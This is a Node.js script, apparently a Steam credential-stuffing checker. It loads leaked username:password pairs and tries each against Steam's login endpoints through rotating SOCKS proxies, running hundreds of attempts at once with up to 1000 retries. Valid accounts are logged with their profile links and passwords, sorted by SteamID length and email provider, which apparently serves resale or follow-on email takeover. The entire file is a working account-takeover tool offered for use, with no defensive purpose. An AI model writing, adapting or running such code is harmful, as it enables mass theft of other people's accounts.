"use strict";

console.log("STARTING...")

require("./util/init-directories");
let request = require('request-promise');
const NodeRSA = require('node-rsa')
const GetProxies = require('./util/get-proxies');
const SocksProxyAgent = require('socks-proxy-agent');
const fs = require('fs')
const steamId = require('./util/steam64-Converter');

let steamURL = 'https://steamcommunity.com/login/'
let userAgent = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
}

// Load accounts
let accounts = fs.readFileSync('to-check-later.txt').toString().split(/\r?\n|\r/).filter(acc => {
    if (acc === "") return false;
    return true;
});
let accountsPointer = 0;

// interval Ids
let feederId = null;
let statsId = null;

let currentChecks = 0;
let checksDone = 0;
let failedChecks = 0;
let totalBadLogins = 0;
let retries = 0;
let proxies;

let fourDig, fiveDig, sixDig, sevenDig, otherDig;
fourDig = fiveDig = sixDig = sevenDig = otherDig = 0;

const RETRY_THRESHOLD = 1000;   //How many times to retry a failed check
const FEED_CONSTANT = 500;


(async () => {
    try {
        proxies = await GetProxies();
    } catch (err) {
        console.log(err);
    }
    Feeder();
    Stats();
})();


function Stats() {
    if (!statsId) {
        statsId = setInterval(() => {
            process.stdout.write('\x1Bc');
            console.log(`\n Checks Done: ${checksDone} of ${accounts.length}`);
            console.log(` 7 Dig: ${sevenDig}`);
            console.log(` 6 Dig: ${sixDig}`);
            console.log(` 5 Dig: ${fiveDig}`);
            console.log(` 4 Dig: ${fourDig}`);
            console.log(` Other: ${otherDig}\n`);

            console.log(` Bad Logins: ${totalBadLogins}`);
            console.log(` Proxies Left: ${proxies.size}`);
            console.log(` Failed Checks: ${failedChecks}`);
            console.log(` Retries: ${retries}`);
            console.log(` Current Checks: ${currentChecks}\n`);

            //stop logging if done checking
            if (checksDone == accounts.length) {
                console.log('Done Checking')
                clearInterval(statsId)
            }
        }, 1000);
    }
}

function Feeder() {
    // current checks must not exceed feed constant
    if (currentChecks >= FEED_CONSTANT) {
        return;
    }

    // clear interval if done.
    if (accountsPointer >= accounts.length - 1) {
        clearInterval(feederId);
        return;
    }

    // feed the checker
    for (; currentChecks < FEED_CONSTANT; currentChecks++) {
        if (accountsPointer == accounts.length) {
            break;
        }

        let account = accounts[accountsPointer].split(":");
        GetRSAKey(account[0], account[1], 0);

        accountsPointer++;
    }

    // Create interval if not created
    if (!feederId) {
        feederId = setInterval(() => Feeder(), 1000);
    }
}


async function GetRSAKey(user, pass, tryCounter) {
    let proxy = proxies.next();
    let socks = `socks4://${proxy.val}`
    let agent = SocksProxyAgent(socks);

    let donotcache = Date.now();

    let options = {
        url: steamURL + "getrsakey/",
        agent: agent,
        form: {
            donotcache: donotcache,
            username: user
        },
        headers: userAgent,
        method: 'POST',
        timeout: 3000
    };


    try {
        let data = await request(options);
        // No data
        if (!data) {
            throw new Error("Error: GetRSAKey returned no data")
        }

        data = JSON.parse(data);
        if (!data.success) {
            throw new Error(data);
        }

        // Sucessfully got rsakey
        // Encrypt password
        let mod = data.publickey_mod
        let exp = data.publickey_exp
        let encryptedPass = EncryptPass(pass, mod, exp);

        // Do login
        let rsaTimeStamp = data.timestamp;
        DoLogin(user, pass, agent, encryptedPass, rsaTimeStamp, donotcache, tryCounter);
        return;

    } catch (err) {
        Retry(user, pass, tryCounter);
    }
}

function EncryptPass(pass, mod, exp) {
    let key = new NodeRSA();

    key.setOptions({
        encryptionScheme: 'pkcs1',
        signingScheme: 'pkcs1-sha256'
    })

    let mod2 = Buffer.from(mod, 'hex');
    let exp2 = Buffer.from(exp, 'hex');

    key.importKey({
        n: mod2,
        e: exp2
    }, 'components-public');

    return key.encrypt(pass, 'base64');
}

async function DoLogin(user, pass, agent, encryptedPass, rsaTimeStamp, donotcache, tryCounter) {
    let options = {
        url: steamURL + "dologin/",
        agent: agent,
        form: {
            donotcache: donotcache,
            password: encryptedPass,
            username: user,
            rsatimestamp: rsaTimeStamp
        },
        headers: userAgent,
        method: 'POST',
        timeout: 3000
    }


    try {
        let data = await request(options);

        //No data
        if (!data) {
            throw new Error("Error: DoLogin returned no data")
        }

        //Catch weird invalid data character
        if (data.charCodeAt(0) != 123) {
            throw new Error("Weird invalid data: " + data.charCodeAt(0));
        }

        data = JSON.parse(data);

        //Bad login
        if ((data.message.indexOf('The account name or password') > -1) || data.requires_twofactor) {
            checksDone++;
            currentChecks--;
            totalBadLogins++;
            return;
        }

        if (data.message) {
            //console.log('retrying: proxy rate limit or captcha')
            throw new Error("Error: " + data.message);
        }

        // good check
        writeToFile(user, pass, data);
    } catch (err) {
        Retry(user, pass, tryCounter);
    }
}



function writeToFile(user, pass, data) {
    currentChecks--;
    checksDone++;
    let steamid = steamId(data.emailsteamid);
    let account = `https://steamcommunity.com/profiles/${data.emailsteamid}\n`
    account += `${steamid[0] + steamid[1]}\n${user}\n${pass}\n\n`
    let digits = steamid[1].length;

    //set correct path
    let email = data.emaildomain;
    let path = `./results/${digits}/`;
    if (digits < 4 || digits > 7) {
        path = `./results/other/`
    }

    if (digits == 7) {
        sevenDig++;
    } else if (digits == 6) {
        sixDig++;
    } else if (digits == 5) {
        fiveDig++;
    } else if (digits == 4) {
        fourDig++;
    } else {
        otherDig++;
    }

    if (email.indexOf('gmx') > -1) {
        email = 'gmx';
    }

    if (email === 'hotmail.com' || email === 'yahoo.com' || email === 'msn.com' ||
        email === 'cox.net' || email === 'comcast.net' || email === 'freenet.de' ||
        email === 'freemail.hu' || email === 'juno.com' || email === 'caramail.com' ||
        email === 'mail.com' || email === 't-online.de' || email === 'gmx' ||
        email === 'free.fr' || email === 'email.com') {
        path += `${email}.txt`
    } else {
        path += `other.txt`
    }

    fs.appendFileSync(path, account);
}

function Retry(user, pass, tryCounter) {
    retries++;
    tryCounter++;

    //do not retry if it's been checked too many times...
    if (tryCounter >= RETRY_THRESHOLD) {
        checksDone++;
        currentChecks--;
        failedChecks++
        let account = `${user}:${pass}\n`
        fs.appendFileSync('./results/too-many-tries.txt', account)
        return;
    }


    GetRSAKey(user, pass, tryCounter);
}